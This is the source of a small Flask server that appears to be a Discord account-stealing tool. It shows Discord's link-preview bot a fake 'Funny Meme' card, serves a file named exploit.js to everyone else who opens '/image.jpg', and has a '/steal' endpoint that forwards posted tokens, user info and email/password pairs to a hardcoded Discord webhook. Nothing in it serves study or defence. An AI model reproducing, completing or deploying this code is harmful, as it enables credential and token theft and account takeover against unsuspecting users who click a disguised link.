from flask import Flask, send_file, request
   import requests
   import os

   app = Flask(__name__)

   WEBHOOK_URL = "https://discord.com/api/webhooks/1386603806502162514/uUmrt5ouu_waJ6xnSAWxNEyvglx6xWawyQcZoXLdjoApXn1Trgvx3DVlC9tTCcTCt4KC"

   PREVIEW_HTML = """
   <!DOCTYPE html>
   <html>
   <head>
       <meta property="og:title" content="Funny Meme">
       <meta property="og:description" content="Check out this hilarious image!">
       <meta property="og:image" content="https://dustrrr.onrender.com/preview.jpg">
       <meta property="og:type" content="website">
   </head>
   <body>
       <p>Nothing to see here.</p>
   </body>
   </html>
   """

   @app.route('/image.jpg')
   def serve_image():
       user_agent = request.headers.get('User-Agent', '')
       if 'Discordbot' in user_agent:
           return PREVIEW_HTML, 200, {'Content-Type': 'text/html'}
       with open('exploit.js', 'r') as f:
           js_code = f.read()
       return js_code, 200, {'Content-Type': 'application/javascript'}

   @app.route('/preview.jpg')
   def serve_preview():
       return send_file('preview.jpg', mimetype='image/jpeg')

   @app.route('/upload', methods=['POST'])
   def upload_image():
       if 'image' not in request.files:
           return 'No image provided', 400
       image = request.files['image']
       if not image.filename.endswith(('.jpg', '.jpeg', '.png')):
           return 'Invalid image format', 400
       image.save('preview.jpg')
       return 'Image updated', 200

   @app.route('/steal', methods=['POST'])
   def steal_data():
       data = request.json
       token = data.get('token')
       user_info = data.get('user_info')
       credentials = data.get('credentials')
       cred_text = "\n".join([f"Email: {cred['email']}, Password: {cred['password']}" for cred in credentials]) if credentials else "No credentials found"
       requests.post(WEBHOOK_URL, json={
           "content": f"Token: {token}\nUser Info: {user_info}\nCredentials:\n{cred_text}"
       })
       return '', 204

 if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))